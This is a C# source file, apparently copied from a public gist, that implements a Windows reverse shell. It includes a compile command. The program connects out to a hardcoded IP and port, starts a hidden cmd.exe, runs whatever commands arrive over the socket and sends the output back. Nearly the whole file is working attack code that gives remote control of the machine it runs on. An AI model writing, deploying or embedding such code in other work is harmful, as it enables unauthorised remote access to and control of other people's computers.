/*
 * Found at: https://gist.github.com/fdiskyou/56b9a4482eecd8e31a1d72b1acb66fac
 * Reference: http://www.codeproject.com/Articles/20250/Reverse-Connection-Shell
 * compile with: mcs ReverseShell.cs -platform:x64 -out:"ReverseShell.exe"
 */

// TODO fix this, no output values with nc but connection
 
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ReverseShell {
	public class ReverseShell {
	
        static String host = "192.168.1.211";        
        static int port = 4242;
		static StreamWriter streamWriter;
		
		public static void Main(string[] args) {
			using(TcpClient client = new TcpClient(host, port)) {
				using(Stream stream = client.GetStream()) {
					using(StreamReader rdr = new StreamReader(stream)) {
						streamWriter = new StreamWriter(stream);						
						StringBuilder strInput = new StringBuilder();
						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;	
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();
						while(true) {
							strInput.Append(rdr.ReadLine());
							strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data)) {
                try {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
	}
}
